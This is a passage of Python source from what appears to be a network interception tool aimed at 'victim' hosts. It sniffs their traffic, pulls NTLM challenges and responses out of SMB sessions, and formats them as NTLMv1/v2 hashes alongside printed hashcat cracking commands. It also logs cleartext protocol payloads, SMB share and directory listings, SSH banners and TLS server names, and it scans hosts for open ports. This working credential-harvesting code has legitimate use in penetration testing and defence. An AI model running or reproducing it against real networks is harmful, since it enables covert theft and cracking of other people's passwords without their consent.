                110: "POP3",
                143: "IMAP",
                194: "IRC",
                513: "Rlogin",
                8080: "HTTP-Proxy",
                1755: "MMS",
            }

            proto = None
            detected_by_content = False
            if flow_key in TRACKED_CLEARTEXT_FLOWS:
                proto = TRACKED_CLEARTEXT_FLOWS[flow_key]
                detected_by_content = True

            else:
                if 6000 <= sport <= 6063 or 6000 <= dport <= 6063:
                    proto = "X11"
                else:
                    proto = tcp_protocols.get(sport) or tcp_protocols.get(dport)

                if proto is None and payload:
                    proto = detect_cleartext_protocol(payload)
                    if proto:
                        detected_by_content = True
                        TRACKED_CLEARTEXT_FLOWS[flow_key] = proto

            if proto and payload:
                direction = (f"{src_ip}:{sport} → {Y}{dst_ip}:{dport}{RESET}")
                highlighted = highlight_keywords(clean_payload)
                label = f"{proto}?" if detected_by_content else proto
                print(f"{current_time()} - {MA}[{label}]{RESET} {direction} | Payload: {Y}{highlighted}{RESET}", flush=True)

            flags = int(tcp.flags)
            if flags & 0x05:  # FIN or RST
                TRACKED_CLEARTEXT_FLOWS.pop(flow_key, None)

        elif packet.haslayer(UDP):
            if "UDP" not in PACKET_FILTER:
                sport = packet[UDP].sport
                dport = packet[UDP].dport
                raw = packet.getlayer(Raw)
                payload = raw.load.decode(errors='ignore') if raw else ""
                clean_payload = payload.rstrip()
                udp_protocols = {
                    7: "Echo",
                    13: "Daytime",
                    19: "Chargen",
                    69: "TFTP",
                    123: "NTP",
                    137: "NetBIOS-Name",
                    138: "NetBIOS-Datagram",
                    139: "NetBIOS-Session",
                    161: "SNMP",
                    162: "SNMP-Trap",
                    389: "LDAP",
                    5060: "SIP",
                    520: "RIP",
                }

                proto = udp_protocols.get(sport) or udp_protocols.get(dport)
                if proto and payload:
                    highlighted = highlight_keywords(clean_payload)
                    print(f"{current_time()} - {MA}[{proto}]{RESET} Payload: {Y}{highlighted}{RESET}")

    except Exception:
        pass


def smb_decode_text(value):
    if value is None:
        return ""

    if isinstance(value, str):
        return value.rstrip("\x00")

    if isinstance(value, bytes):
        try:
            return value.decode("utf-16-le").rstrip("\x00")
        except UnicodeDecodeError:
            return value.decode("utf-8", errors="replace").rstrip("\x00")
    return str(value)


def smb_walk_layers(root):
    stack = [root]
    seen = set()
    while stack:
        layer = stack.pop()
        if not isinstance(layer, Packet) or id(layer) in seen:
            continue

        seen.add(id(layer))
        yield layer
        if isinstance(layer.payload, Packet):
            stack.append(layer.payload)

        for value in getattr(layer, "fields", {}).values():
            if isinstance(value, Packet):
                stack.append(value)
            elif isinstance(value, (list, tuple)):
                stack.extend(item for item in value if isinstance(item, Packet))


def smb_create_filename(layer):
    try:
        name_len = int(getattr(layer, "NameLen", 0) or 0)
        buffer = getattr(layer, "Buffer", None)
        if isinstance(buffer, bytes):
            raw = buffer
        elif isinstance(buffer, bytearray):
            raw = bytes(buffer)
        elif isinstance(buffer, Packet):
            raw = bytes(buffer)
        else:
            return ""

        if name_len <= 0:
            return ""

        return raw[:name_len].decode("utf-16-le", errors="replace").rstrip("\x00")
    except (ValueError, TypeError, AttributeError):
        return ""


def process_smb2_packet(packet):
    try:
        if not packet.haslayer(TCP):
            return
        tcp = packet[TCP]
        if tcp.sport not in (139, 445) and tcp.dport not in (139, 445):
            return
        if not packet.haslayer(SMB2_Header):
            return
        if packet.haslayer(IP):
            src, dst = packet[IP].src, packet[IP].dst
        elif packet.haslayer(IPv6):
            src, dst = packet[IPv6].src, packet[IPv6].dst
        else:
            return

        layers = list(smb_walk_layers(packet))
        for layer in layers:
            if isinstance(layer, SMB2_Tree_Connect_Request):
                path = getattr(layer, "Path", None)
                if not path:
                    buffer = getattr(layer, "Buffer", None)
                    if isinstance(buffer, bytes):
                        path = smb_decode_text(buffer)
                if path:
                    print(f"{current_time()} - {R}[SMB2 TREE CONNECT]{RESET} {src} → {Y}{dst}{RESET} | Share: {Y}{smb_decode_text(path)}{RESET}")

        for layer in layers:
            if isinstance(layer, SMB2_Create_Request):
                header = getattr(layer, "underlayer", None)
                headers = [h for h in layers if isinstance(h, SMB2_Header)]
                filename = smb_create_filename(layer)
                if not filename:
                    continue
                mid = None
                for h in headers:
                    if h.payload is layer:
                        mid = int(h.MID)
                        break
                if mid is None and isinstance(header, SMB2_Header):
                    mid = int(header.MID)
                if mid is not None:
                    SMB2_CREATE_PENDING[(src, dst, mid)] = filename

        for layer in layers:
            if not isinstance(layer, SMB2_Create_Response):
                continue
            header = getattr(layer, "underlayer", None)
            if isinstance(header, SMB2_Header):
                mid = int(header.MID)
            else:
                mid = None
                for h in layers:
                    if isinstance(h, SMB2_Header) and h.payload is layer:
                        mid = int(h.MID)
                        break
            if mid is None:
                continue
            key = (dst, src, mid)
            filename = SMB2_CREATE_PENDING.pop(key, None)
            if filename:
                print(f"{current_time()} - {MA}[SMB2 CREATE RESPONSE]{RESET} {src} → {Y}{dst}{RESET} | File: {Y}{filename}{RESET}")

    except Exception as e:
        print(f"[WARN-SMB2] {type(e).__name__}: {e}")


def detect_ntlmssp_auth(packet):
    if not packet.haslayer(TCP):
        return

    tcp = packet[TCP]
    if tcp.sport not in (139, 445) and tcp.dport not in (139, 445):
        return

    if packet.haslayer(IP):
        src, dst = packet[IP].src, packet[IP].dst
    elif packet.haslayer(IPv6):
        src, dst = packet[IPv6].src, packet[IPv6].dst
    else:
        return

    sport, dport = tcp.sport, tcp.dport
    data = bytes(tcp.payload)
    marker = b"NTLMSSP\x00"
    pos = data.find(marker)
    if pos < 0 or len(data) < pos + 64:
        return

    msg_type = int.from_bytes(data[pos + 8:pos + 12], "little")

    # ─── Type 2: CHALLENGE ───────────────────────────────────────────────────
    if msg_type == 2:
        server_challenge = data[pos + 24:pos + 32].hex()
        NTLM_CHALLENGES[(src, dst, sport, dport)] = server_challenge
        print(f"{current_time()} - {R}[NTLM CHALLENGE]{RESET} "
              f"{src}:{sport} → {Y}{dst}:{dport}{RESET} | Challenge: {Y}{server_challenge}{RESET}")
        return

    if msg_type != 3:
        return

    # ─── Type 3: AUTH ────────────────────────────────────────────────────────
    challenge = NTLM_CHALLENGES.pop((dst, src, dport, sport), None)
    if challenge is None:
        challenge = "0000000000000000"
        print(f"{Y}[!] Challenge non trouvé pour {src}:{sport} → {dst}:{dport}{RESET}")

    def read_field(offset):
        length = int.from_bytes(data[pos + offset:pos + offset + 2], "little")
        offset_val = int.from_bytes(data[pos + offset + 4:pos + offset + 8], "little")
        start = pos + offset_val
        end = start + length
        if length == 0 or start < pos or end > len(data):
            return b""
        return data[start:end]

    lm_resp  = read_field(12)
    nt_resp  = read_field(20)
    domain   = read_field(28).decode("utf-16-le", errors="replace").rstrip("\x00")
    username = read_field(36).decode("utf-16-le", errors="replace").rstrip("\x00")
    if not username:
        username = "(unknown)"
    if not domain:
        domain = ""

    # ─── NTLMv2 ──────────────────────────────────────────────────────────────
    is_ntlmv2 = (len(nt_resp) > 16 and nt_resp[16:18] == b"\x01\x01")
    if is_ntlmv2:
        nt_proof = nt_resp[0:16].hex()
        blob     = nt_resp[16:].hex()
        print(f"  → {Y}NTLMv2{RESET} (len nt_resp={len(nt_resp)}, version=0101)")
        print(f"  NTProof : {nt_proof}")
        print(f"  Blob    : {blob[:60]}{'…' if len(blob) > 60 else ''} ({len(blob)} hex chars)")

        # ─── hashcat hash ───────────────────────────────────────────────
        hash_5600 = f"{username}::{domain}:{challenge}:{nt_proof}:{blob}"
        print(f"\n{G}[+] {Y}NTLMv2 HASH{RESET} | {src}:{sport} → {dst}:{dport}")
        print(f"    User      : {R}{username}{RESET} | Domain: {Y}{domain}{RESET}")
        print(f"    Challenge : {Y}{challenge}{RESET}")
        print(f"    NTProof   : {Y}{nt_proof}{RESET}")
        print(f"    Blob      : {Y}{blob[:60]}{'…' if len(blob) > 60 else ''}{RESET}")
        print(f"    Command   :{RESET}")
        print(f"    {Y}hashcat -m 5600 -a 0 \"{hash_5600}\" <wordlist>{RESET}")
        print(f"{'=' * 60}")

    # ─── NTLMv1 ──────────────────────────────────────────────────────────────
    else:
        print(f"  → {Y}NTLMv1{RESET} (len={len(nt_resp)})")
        lm_hex = lm_resp.hex()
        nt_hex = nt_resp.hex()

        if len(nt_hex) != 48:
            print(f"  {R}[ERROR]{RESET} NT hash must be 48 hex, is {len(nt_hex)}")
            print(f"  nt_resp: {nt_resp.hex()}")
            print(f"{'=' * 60}")
            return

        if not lm_hex or all(c == '0' for c in lm_hex):
            print(f"  LM disabled → mode 300")
            print(f"\n{R}[+] NTLMv1 (LM disabled){RESET} | {src}:{sport} → {dst}:{dport}")
            print(f"    User    : {R}{username}{RESET} | Domain: {Y}{domain}{RESET}")
            print(f"    NT Hash : {Y}{nt_hex}{RESET}")
            print(f"    Command :{RESET}")
            print(f"    {Y}hashcat -m 300 -a 0 \"{nt_hex}\" <wordlist>{RESET}")
        else:
            hash_100 = f"{username}::{domain}:{lm_hex}:{nt_hex}"
            print(f"  LM active → mode 100")
            print(f"\n{R}[+] NTLMv1{RESET} | {src}:{sport} → {dst}:{dport}")
            print(f"    User    : {R}{username}{RESET} | Domain: {Y}{domain}{RESET}")
            print(f"    LM      : {Y}{lm_hex}{RESET} | NT: {Y}{nt_hex}{RESET}")
            print(f"    Command :{RESET}")
            print(f"    {Y}hashcat -m 100 -a 0 \"{hash_100}\" <wordlist>{RESET}")
        print(f"{'=' * 60}")

SMB2_SIG = b"\xfeSMB"
SMB2_TRANSFORM_SIG = b"\xfdSMB"
NETBIOS_SESSION_MESSAGE = 0x00
SMB2_COMMAND_NAMES = {
    0: "NEGOTIATE",
    1: "SESSION_SETUP",
    2: "LOGOFF",
    3: "TREE_CONNECT",
    4: "TREE_DISCONNECT",
    5: "CREATE",
    6: "CLOSE",
    7: "FLUSH",
    8: "READ",
    9: "WRITE",
    10: "LOCK",
    11: "IOCTL",
    12: "CANCEL",
    13: "ECHO",
    14: "FIND",
    15: "NOTIFY",
    16: "GET_INFO",
    17: "SET_INFO",
    18: "OPLOCK_BREAK"
}

STATUS_SUCCESS = 0x00000000
STATUS_NO_MORE_FILES = 0x80000006
STATUS_NO_SUCH_FILE = 0xC000000F
STATUS_NO_MORE_ENTRIES = 0x8000001A

# FILE_INFORMATION_CLASS values used by SMB2 QUERY_DIRECTORY.
FILE_DIRECTORY_INFORMATION = 0x01
FILE_FULL_DIR_INFORMATION = 0x02
FILE_BOTH_DIR_INFORMATION = 0x03
FILE_NAMES_INFORMATION = 0x0C
FILE_ID_BOTH_DIR_INFORMATION = 0x25
FILE_ID_FULL_DIR_INFORMATION = 0x26

def packet_ips(packet):
    if IP in packet:
        return packet[IP].src, packet[IP].dst
    if IPv6 in packet:
        return packet[IPv6].src, packet[IPv6].dst
    return None, None

def decode_utf16_name(data):
    try:
        return data.decode("utf-16-le", errors="strict").rstrip("\x00")
    except UnicodeDecodeError:
        return ""

class TCPStreamReassembler:
    def __init__(self, max_buffer=8 * 1024 * 1024, idle_timeout=300):
        self.max_buffer = max_buffer
        self.idle_timeout = idle_timeout
        self.flows = {}

    def _new_flow(self, seq, now):
        return {
            "next_seq": seq,
            "pending": {},       # absolute TCP seq -> bytes
            "buffer": bytearray(),
            "last_seen": now
        }

    @staticmethod
    def _seq_delta(a, b):
        """Signed 32-bit TCP sequence delta: a - b."""
        value = (a - b) & 0xFFFFFFFF
        if value >= 0x80000000:
            value -= 0x100000000
        return value

    def _expire(self, now):
        expired = [
            key for key, flow in self.flows.items()
            if now - flow["last_seen"] > self.idle_timeout
        ]
        for key in expired:
            del self.flows[key]

    def feed(self, key, seq, data, syn=False, fin=False, now=None):
        if now is None:
            now = time.time()
        self._expire(now)
        if not data:
            return b""

        seq &= 0xFFFFFFFF
        # SYN consumes one sequence number before payload.
        data_seq = (seq + (1 if syn else 0)) & 0xFFFFFFFF

        flow = self.flows.get(key)
        if flow is None:
            flow = self._new_flow(data_seq, now)
            self.flows[key] = flow
        flow["last_seen"] = now
        next_seq = flow["next_seq"]
        delta = self._seq_delta(data_seq, next_seq)

        # Entire segment is already behind the contiguous frontier.
        if delta + len(data) <= 0:
            return self._drain(flow)

        # Trim bytes already received/consumed.
        if delta < 0:
            data = data[-delta:]
            data_seq = next_seq
            delta = 0

        # Limit future data so a malformed capture cannot grow unbounded.
        if delta > self.max_buffer:
            # Likely a midstream capture or a large gap. Re-anchor at this
            # segment rather than retaining an unusable gap forever.
            flow["pending"].clear()
            flow["buffer"].clear()
            flow["next_seq"] = data_seq
            next_seq = data_seq
            delta = 0

        # Store only if this sequence start isn't already pending.
        # For overlaps, the earliest stored segment wins; subsequent contiguous
        # segments are trimmed as the stream advances.
        flow["pending"].setdefault(data_seq, data)
        return self._drain(flow)

    def _drain(self, flow):
        output = bytearray()
        while True:
            next_seq = flow["next_seq"]
            candidate_key = None
            candidate_data = None
            candidate_delta = None
            for start, chunk in list(flow["pending"].items()):
                delta = self._seq_delta(start, next_seq)
                if delta <= 0:
                    # Segment starts at/before frontier. Trim consumed overlap.
                    trim = -delta
                    if trim >= len(chunk):
                        del flow["pending"][start]
                        continue
                    candidate_key = start
                    candidate_data = chunk[trim:]
                    candidate_delta = delta
                    break
                if delta > 0:
                    continue

            if candidate_key is not None:
                del flow["pending"][candidate_key]
                if candidate_data:
                    output.extend(candidate_data)
                    flow["next_seq"] = (
                        flow["next_seq"] + len(candidate_data)
                    ) & 0xFFFFFFFF
                continue

            # If no segment begins at/before the frontier, stop and wait for
            # a missing segment. Exact-frontier segments are handled above.
            break

        if len(output) > self.max_buffer:
            output = output[-self.max_buffer:]

        flow["buffer"].extend(output)
        if len(flow["buffer"]) > self.max_buffer:
            del flow["buffer"][:-self.max_buffer]
        return bytes(output)


def extract_netbios_smb_messages(buffer):
    """
    Extract complete NetBIOS Session Service messages from a byte buffer.
    Returns (messages, remaining_bytes).

    NetBIOS session message:
      byte 0: message type (0x00)
      bytes 1..3: 24-bit big-endian payload length
    """
    messages = []
    offset = 0
    while len(buffer) - offset >= 4:
        msg_type = buffer[offset]
        if msg_type != NETBIOS_SESSION_MESSAGE:
            # SMB direct-hosted TCP normally uses 0x00. Other NetBIOS session
            # control records are skipped only when their framing is known.
            # Leave unknown framing untouched for diagnostics.
            break

        length = int.from_bytes(buffer[offset + 1:offset + 4], "big")
        if length <= 0:
            offset += 4
            continue

        end = offset + 4 + length
        if end > len(buffer):
            break

        payload = bytes(buffer[offset + 4:end])
        messages.append(payload)
        offset = end
    return messages, bytes(buffer[offset:])


def parse_smb2_header(message):
    """Return basic SMB2 header fields, or None for non-SMB2 messages."""
    if len(message) < 64 or not message.startswith(SMB2_SIG):
        return None

    structure_size = int.from_bytes(message[4:6], "little")
    if structure_size != 64:
        return None

    status_or_channel = int.from_bytes(message[8:12], "little")
    command = int.from_bytes(message[12:14], "little")
    flags = int.from_bytes(message[16:20], "little")
    next_command = int.from_bytes(message[20:24], "little")
    message_id = int.from_bytes(message[24:32], "little")
    return {
        "status": status_or_channel,
        "command": command,
        "flags": flags,
        "is_response": bool(flags & 0x00000001),
        "next_command": next_command,
        "message_id": message_id
    }


def split_compound_smb2(message):
    """Split SMB2 compound messages using NextCommand offsets."""
    items = []
    offset = 0
    while offset + 64 <= len(message):
        part = message[offset:]
        header = parse_smb2_header(part)
        if header is None:
            break

        next_command = header["next_command"]
        if next_command:
            if next_command < 64 or offset + next_command > len(message):
                break
            items.append((part[:next_command], header))
            offset += next_command
        else:
            items.append((part, header))
            break
    return items


def filetime_to_local(value):
    """Convert Windows FILETIME (100 ns since 1601 UTC) to local time."""
    if not value:
        return "—"
    try:
        seconds, remainder = divmod(value, 10_000_000)
        dt = datetime(1601, 1, 1, tzinfo=timezone.utc) + timedelta(seconds=seconds, microseconds=remainder // 10)
        return dt.astimezone().strftime("%b %d, %Y %H:%M:%S.%f") + " local"
    except (OverflowError, ValueError, OSError):
        return f"FILETIME({value})"


def parse_find_response(message, header, info_class=None):
    """
    Parse SMB2 QUERY_DIRECTORY/FIND responses.
    Returns (entries, result), with timestamps decoded from Windows FILETIME.
    """
    status = header["status"]
    if status in (STATUS_NO_MORE_FILES, STATUS_NO_MORE_ENTRIES):
        return [], "end"
    if status != STATUS_SUCCESS:
        return [], f"status=0x{status:08x}"
    if len(message) < 72:
        return [], "short FIND response"

    body = 64
    structure_size = int.from_bytes(message[body:body + 2], "little")
    if structure_size != 9:
        return [], f"unexpected FIND response StructureSize={structure_size}"

    output_offset = int.from_bytes(message[body + 2:body + 4], "little")
    output_length = int.from_bytes(message[body + 4:body + 8], "little")
    if output_length == 0:
        return [], "empty directory response"
    if output_offset < 64 or output_offset + output_length > len(message):
        return [], "invalid output buffer bounds"

    # (filename offset, filename-length offset, creation, access, write, change)
    layouts = {
        FILE_DIRECTORY_INFORMATION: (64, 60, 8, 16, 24, 32),
        FILE_FULL_DIR_INFORMATION: (68, 60, 8, 16, 24, 32),
        FILE_BOTH_DIR_INFORMATION: (94, 60, 8, 16, 24, 32),
        FILE_NAMES_INFORMATION: (12, 8, None, None, None, None),
        FILE_ID_BOTH_DIR_INFORMATION: (104, 60, 8, 16, 24, 32),
        FILE_ID_FULL_DIR_INFORMATION: (80, 60, 8, 16, 24, 32),
    }
    if info_class in layouts:
        candidates = [layouts[info_class]]
    else:
        candidates = [
            layouts[FILE_ID_BOTH_DIR_INFORMATION],
            layouts[FILE_BOTH_DIR_INFORMATION],
            layouts[FILE_ID_FULL_DIR_INFORMATION],
            layouts[FILE_FULL_DIR_INFORMATION],
            layouts[FILE_DIRECTORY_INFORMATION],
            layouts[FILE_NAMES_INFORMATION],
        ]

    data = message[output_offset:output_offset + output_length]
    entries = []
    cursor = 0
    while cursor < len(data):
        remaining = len(data) - cursor
        if remaining < 12:
            break

        next_entry = int.from_bytes(data[cursor:cursor + 4], "little")
        entry_span = next_entry if next_entry else remaining
        if entry_span < 12 or entry_span > remaining:
            break

        selected = None
        for layout in candidates:
            name_offset, name_len_offset = layout[0], layout[1]
            if name_len_offset + 4 > entry_span:
                continue
            name_len = int.from_bytes(data[cursor + name_len_offset:cursor + name_len_offset + 4], "little")
            if (name_len % 2 == 0 and name_offset + name_len <= entry_span):
                selected = (layout, name_len)
                break
        if selected is None:
            return entries, "could not parse directory-entry layout"

        layout, name_len = selected
        name_offset, _, create_off, access_off, write_off, change_off = layout
        name = decode_utf16_name(data[cursor + name_offset:cursor + name_offset + name_len])

        def read_filetime(offset):
            if offset is None or offset + 8 > entry_span:
                return None
            return int.from_bytes(data[cursor + offset:cursor + offset + 8], "little")

        if name:
            entries.append({
                "name": name,
                "creation": filetime_to_local(read_filetime(create_off)) if create_off is not None else "N/A",
                "last_access": filetime_to_local(read_filetime(access_off)) if access_off is not None else "N/A",
                "last_write": filetime_to_local(read_filetime(write_off)) if write_off is not None else "N/A",
                "last_change": filetime_to_local(read_filetime(change_off)) if change_off is not None else "N/A",
            })

        if next_entry == 0:
            break
        cursor += next_entry
    return entries, "ok"


class SMB2Monitor:
    def __init__(self, verbose=False):
        self.verbose = verbose
        self.reassembler = TCPStreamReassembler()
        self.buffers = defaultdict(bytearray)
        self.tree_shares = {}       # (client, server, tree_id) -> share
        self.find_requests = {}     # (client, server, message_id) -> info class
        self.seen_names = defaultdict(set)

    def log(self, message):
        print(time.strftime("[%H:%M:%S] -"), message, flush=True)

    def process_message(self, src, dst, sport, dport, message):
        if message.startswith(SMB2_TRANSFORM_SIG):
            if self.verbose:
                self.log(f"[SMB ENCRYPTED] {src} → {dst} ({len(message)} bytes)")
            return
        if not message.startswith(SMB2_SIG):
            if self.verbose:
                self.log(f"[NON-SMB2] {src}:{sport} → {dst}:{dport} {len(message)} bytes, prefix={message[:12].hex()}")
            return

        for part, header in split_compound_smb2(message):
            command = header["command"]
            is_response = header["is_response"]
            msg_id = header["message_id"]
            status = header["status"]
            if not is_response:
                # QUERY_DIRECTORY request body: StructureSize at 64,
                # FileInformationClass at 66, FileIndex at 68.
                if command == 14 and len(part) >= 72:
                    info_class = int.from_bytes(part[66:68], "little")
                    self.find_requests[(src, dst, msg_id)] = info_class
                    if self.verbose:
                        self.log(f"{R}[SMB2 FIND REQUEST]{RESET} {src} → {Y}{dst}{RESET} MessageId={msg_id} class=0x{info_class:02x}")

                elif command == 3 and len(part) >= 72:
                    # TREE_CONNECT request path offset/length at body + 4/+6.
                    path_offset = int.from_bytes(part[68:70], "little")
                    path_length = int.from_bytes(part[70:72], "little")
                    path = ""
                    if (path_length and path_offset >= 64 and path_offset + path_length <= len(part)):
                        path = decode_utf16_name(part[path_offset:path_offset + path_length])

                    if path:
                        self.log(f"{R}[SMB2 TREE CONNECT]{RESET} {src} → {Y}{dst}{RESET} | Share: {path}")
                continue

            if command == 3 and status == STATUS_SUCCESS and len(part) >= 68:
                tree_id = int.from_bytes(part[36:40], "little")
                # Associate the share from a prior request when available.
                self.tree_shares[(dst, src, tree_id)] = self.tree_shares.get((dst, src, tree_id), "unknown")

            if command != 14:
                continue

            info_class = self.find_requests.get((dst, src, msg_id))
            entries, result = parse_find_response(part, header, info_class)
            if result == "end":
                if self.verbose:
                    self.log(f"{R}[SMB2 FIND END]{RESET} {src} → {Y}{dst}{RESET} MessageId={msg_id} STATUS_NO_MORE_FILES")
                continue

            if result != "ok":
                if self.verbose:
                    self.log(f"{R}[SMB2 FIND]{RESET} {src} → {Y}{dst}{RESET} MessageId={msg_id}: {result}")
                continue

            key = (src, dst, msg_id)
            fresh = []
            for entry in entries:
                name = entry["name"]
                if name not in (".", "..") and name not in self.seen_names[key]:
                    self.seen_names[key].add(name)
                    fresh.append(entry)

            if fresh:
                self.log(f"{R}[SMB2 DIR ENUM]{RESET} {src} → {Y}{dst}{RESET} | MessageId={msg_id} | new items: {len(fresh)}")
                for entry in fresh:
                    print(
                        f"    {C}Name: {Y}{entry['name']}{RESET} | "
                        f"{C}Create: {RESET}{entry.get('creation', 'N/A').replace(' local', '').split('.')[0]} | "
                        f"{C}Last Access: {RESET}{entry.get('last_access', 'N/A').replace(' local', '').split('.')[0]} | "
                        f"{C}Last Write: {RESET}{entry.get('last_write', 'N/A').replace(' local', '').split('.')[0]} | "
                        f"{C}Last Change: {RESET}{entry.get('last_change', 'N/A').replace(' local', '').split('.')[0]}",
                        flush=True
                    )

    def handle_packet(self, packet):
        if TCP not in packet:
            return

        src, dst = packet_ips(packet)
        if src is None:
            return

        tcp = packet[TCP]
        if tcp.sport not in (139, 445) and tcp.dport not in (139, 445):
            return

        payload = bytes(tcp.payload)
        if not payload:
            return

        key = (src, dst, tcp.sport, tcp.dport)
        seq = int(tcp.seq)
        syn = bool(int(tcp.flags) & 0x02)
        fin = bool(int(tcp.flags) & 0x01)
        contiguous = self.reassembler.feed(key, seq, payload, syn=syn, fin=fin)
        if not contiguous:
            return

        buf = self.buffers[key]
        buf.extend(contiguous)
        messages, remaining = extract_netbios_smb_messages(bytes(buf))
        self.buffers[key] = bytearray(remaining)
        if self.verbose:
            self.log(f"[TCP] {src}:{tcp.sport} → {dst}:{tcp.dport} payload={len(payload)} reassembled={len(contiguous)} messages={len(messages)} buffered={len(remaining)}")

        for message in messages:
            self.process_message(src, dst, tcp.sport, tcp.dport, message)


_smb2_monitor = SMB2Monitor(verbose=False)
def detect_smb2_find_response(packet):
    try:
        _smb2_monitor.handle_packet(packet)
    except Exception as exc:
        print(f"{R}[SMB2 DEBUG]{RESET} Error while parsing packet: {exc}", flush=True)


def reset_smb2_detector():
    global _smb2_monitor
    _smb2_monitor = SMB2Monitor(verbose=False)


def process_SSH_packet(packet):
    if TCP not in packet:
        return

    tcp = packet[TCP]
    if tcp.sport != SSH_PORT and tcp.dport != SSH_PORT:
        return

    if IP in packet:
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
    elif IPv6 in packet:
        src_ip = packet[IPv6].src
        dst_ip = packet[IPv6].dst
    else:
        return

    src = (src_ip, tcp.sport)
    dst = (dst_ip, tcp.dport)
    connection = tuple(sorted((src, dst)))
    if connection not in _ssh_seen_connections:
        _ssh_seen_connections.add(connection)
        print(f"[{time.strftime('%H:%M:%S')}] - {MA}[SSH CONNECTION]{RESET} {src_ip}:{tcp.sport} -> {Y}{dst_ip}:{tcp.dport}{RESET}", flush=True)

    if Raw not in packet:
        return

    payload = bytes(packet[Raw].load)
    for line in payload.splitlines():
        line = line.strip(b"\r\n")
        if not line.startswith(b"SSH-"):
            continue

        banner = line.decode("ascii", errors="replace")
        banner_key = (connection, src, banner)
        if banner_key in _ssh_seen_banners:
            continue

        _ssh_seen_banners.add(banner_key)
        print(f"[{time.strftime('%H:%M:%S')}] - {MA}[SSH BANNER]{RESET} {src_ip}:{tcp.sport} -> {Y}{dst_ip}:{tcp.dport}{RESET} | {banner}", flush=True)


def build_capture_filter(targets):
    if not targets:
        raise ValueError("At least one target IP is required")

    conditions = [
        f"(src host {ip} or dst host {ip})"
        for ip in sorted(targets)
    ]
    return " or ".join(conditions)


def sniff_traffic(): # Sniff source & destinations packets from the target
    print("[*] Sniffing DNS, HTTP, and TLS traffic...")

    def handle_packet(packet):
        try:
            if IP not in packet and IPv6 not in packet:
                return

            if packet.haslayer(IP):
                src = packet[IP].src
                dst = packet[IP].dst

            elif packet.haslayer(IPv6):
                src = packet[IPv6].src
                dst = packet[IPv6].dst

            else:
                src = "?"
                dst = "?"

            sport = 0
            dport = 0

            if packet.haslayer(TCP):
                sport = packet[TCP].sport
                dport = packet[TCP].dport


            # HTTP
            try:
                if "HTTP" not in PACKET_FILTER:
                    process_http_packet(packet)
            except Exception as e:
                print(f"[WARN-HTTP] {type(e).__name__}: {e}")

            # DNS
            try:
                if "DNS" not in PACKET_FILTER:
                    process_DNS__packet(packet)
            except Exception as e:
                print(f"[WARN-DNS] {type(e).__name__}: {e}")

            # SMB
            try:
                if "SMB" not in PACKET_FILTER:
                    detect_ntlmssp_auth(packet)
                    process_smb2_packet(packet)
                    if EXCLUDE_SMB_FOLDERS == False:
                        detect_smb2_find_response(packet)
            except Exception as e:
                print(f"[WARN-SMB] {type(e).__name__}: {e}")

            # SSH
            try:
                if "SSH" not in PACKET_FILTER:
                    process_SSH_packet(packet)
            except Exception as e:
                print(f"[WARN-SSH] {type(e).__name__}: {e}")

            # SSDP
            try:
                if "SSDP" not in PACKET_FILTER:
                    process_ssdp_packet(packet)
            except Exception as e:
                print(f"[WARN-SSDP] {type(e).__name__}: {e}")

            # TLS
            try:
                if "TLS" not in PACKET_FILTER:
                    extract_sni(packet)
            except Exception as e:
                print(f"[WARN-TLS] {type(e).__name__}: {e}")

            # External IP
            try:
                if packet.haslayer(UDP) or packet.haslayer(TCP):
                    for ip in (src, dst):
                        if ip not in victim_ips and not ip.startswith("fe80"):
                            if "IP" not in PACKET_FILTER:
                                handle_external_ip(ip)
            except Exception as e:
                print(f"[WARN-IP] {type(e).__name__}: {e}")

            # Cleartext protocoles
            try:
                process_cleartext_protocols(packet)
            except Exception as e:
                print(f"[WARN-CLEARTEXT] {type(e).__name__}: {e}")

        except Exception as e:
            print(f"[ERROR-PACKET] {type(e).__name__}: {e}")

    capture_filter = build_capture_filter(victim_ips)
    sniff(filter=capture_filter, prn=handle_packet, store=0, iface=iface_spy)    


########################## CONNECT DISCOVERY MODE (--connect) ##########################
def scan_host(ip):
    ip_str = str(ip)
    reachable = False
    open_ports = []
    titles = []
    services = []

    for port in PORTS:
        try:
            with socket.create_connection((ip_str, port), timeout=2):
                reachable = True
                open_ports.append(port)
        except:
            continue

    if reachable:
        for port in open_ports:
            if port in WEB_PORTS:
                proto = "https" if port in [443, 8443] else "http" # Display HTTPS or HTTP reachable target
                url = f"{proto}://{ip_str}:{port}"
                try:
                    resp = requests.get(url, timeout=2, verify=False, allow_redirects=True)
                    title = "Untitled page"
                    if "<title>" in resp.text.lower():
                        start = resp.text.lower().find("<title>") + 7
                        end = resp.text.lower().find("</title>")
                        title = resp.text[start:end].strip()
                    titles.append(title)
                    services.append("HTTP/HTTPS")
                except:
                    titles.append("Not accessible")
                    services.append("HTTP/HTTPS")
            else:
                service_name = OTHER_PORTS.get(port, "Unknown")
                titles.append("N/A")
                services.append(service_name)

        found_hosts.append((ip_str, open_ports, services, titles))
        print(f"{G}[+] {Y}{ip_str}{RESET} | Ports: {open_ports} | Services: {services} | Infos: {titles}")

########################## PASSIVE LISTEN MODE (--listen) ##########################
def get_oui(mac, oui_map):
    if not mac:
        return "?"
    prefix = mac.upper().replace(":", "").replace("-", "")[:6]
    return oui_map.get(prefix, "Unknown")

def get_vendor(mac, oui_map):
    if not mac or not oui_map:
        return None
    prefix = mac.upper().replace(":", "")[:6]
    return oui_map.get(prefix)

def get_oui(mac, oui_map):
    if not mac:
        return "?"
    prefix = mac.upper().replace(":", "").replace("-", "")[:6]
    return oui_map.get(prefix, "Unknown")

def get_hostname(ip):
    try:
        return socket.gethostbyaddr(ip)[0]
    except:
        return None

def decode_browser_announcement(payload):
    """
    Decode a NetBIOS Browser Host Announcement (command 0x01)
    from a UDP/138 payload.

    Returns a dictionary containing decoded fields, or None
    if no valid Host Announcement is found.
    """
    if not payload or len(payload) < 32:
        return None

    signature = b"\x55\xaa"
    pos = 0
    flags = {
        0x00000001: "Workstation",
        0x00000002: "Server",
        0x00000004: "SQL Server",
        0x00000008: "Domain Controller",
        0x00000010: "Backup Controller",
        0x00000020: "Time Source",
        0x00000040: "Apple Host",
        0x00000080: "Novell Server",
        0x00000100: "Domain Member",
        0x00000200: "Print Server",
        0x00000400: "Dial-in Server",
        0x00000800: "Xenix Host",
        0x00001000: "NT Workstation",
        0x00002000: "WfW Host",
        0x00004000: "NT Server",
        0x00008000: "Potential Browser",
        0x00010000: "Backup Browser",
        0x00020000: "Master Browser",
        0x00040000: "Domain Master Browser",
        0x00080000: "OSF Host",
        0x00100000: "VMS Host",
        0x00200000: "Windows 95+",
